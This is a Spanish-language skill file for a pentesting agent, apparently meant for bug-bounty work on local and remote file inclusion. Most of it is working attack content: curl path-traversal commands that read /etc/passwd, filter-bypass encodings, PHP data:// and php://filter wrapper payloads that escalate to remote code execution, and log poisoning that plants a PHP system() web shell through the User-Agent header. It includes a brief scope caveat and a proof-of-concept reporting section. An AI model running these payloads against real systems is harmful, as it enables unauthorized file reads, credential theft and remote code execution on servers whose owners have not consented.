---
name: lfi-rfi
description: "LFI/RFI: path traversal, wrappers PHP, log poisoning y escalada a RCE. Incluye wordlists por OS y payloads."
version: 1.0.0
author: Fr4ndev
license: MIT
platforms: [linux, macos]
metadata:
  tags: [attack, lfi, rfi, traversal, rce, wrappers]
  tools: [loxs.py, curl]
  required: [curl]
  related_skills: [loxs-scanner, ssrf-crlf]
  stage: attack
---

# LFI / RFI / Path Traversal

## 1 — Detección

```bash
python3 tools/loxs/loxs.py -l urls_params.txt -t lfi

# manual — canario Unix/Windows
curl -s "https://target.com/page?file=../../../../etc/passwd" | grep -q "root:" && echo LFI_CONFIRMED
curl -s "https://target.com/page?file=..%2f..%2f..%2f..%2fetc%2fpasswd" | grep -q "root:" && echo LFI_ENCODED
```

Wordlists: `tools/loxs/payloads/lfi.txt`, `wordlists/directory_traversal_unix.txt`, `wordlists/directory_traversal_win.txt`, `wordlists/lfi.txt`.

## 2 — Bypass de filtros

- Encoding: `..%2f` · `..%252f` · `%2e%2e/` · `....//` · `..;/`
- Null byte (PHP legacy): `../../../../etc/passwd%00`
- Deep paths: `/etc/passwd/././.` (filtros que solo miran el final)
- Case: `/Etc/Passwd` en macOS/NTFS

## 3 — Escalada a RCE (PHP wrappers)

```bash
# confirmar interpretación PHP
curl -s "https://target.com/page?file=php://filter/convert.base64-encode/resource=index" | base64 -d

# incluir archivo controlado (upload propio en scope, o image con payload)
curl -s "https://target.com/page?file=../../../../tmp/shell.jpg"

# data wrapper (no necesita archivo en disco)
curl -s --get "https://target.com/page" --data-urlencode 'file=data://text/plain,<?php system($_GET[c]); ?>' \
  "https://target.com/page&c=id"
```

## 4 — Log poisoning

```bash
# 1. inyecta PHP en User-Agent (queda en access.log)
curl -s -A "<?php system(\$_GET['cmd']); ?>" https://target.com/ >/dev/null

# 2. incluye el log vía LFI
curl -s "https://target.com/page?file=../../../../var/log/apache2/access.log&cmd=id"
# rutas comunes: /var/log/apache2/access.log, /var/log/httpd/access_log,
# /proc/self/environ (si User-Agent se copia ahí), /var/lib/php/sessions/
```

## 5 — PoC para reporte

Muestra: `/etc/passwd` con 2 líneas (root + un usuario) o salida de `id` vía wrapper. **No cuelgues shells**, no pivotas a otros hosts. Impacto: lectura de config con DB creds = critical.

## Windows

`wordlists/directory_traversal_win.txt` → `C:\Windows\win.ini`, `web.config`, `\inetpub\logs\`.
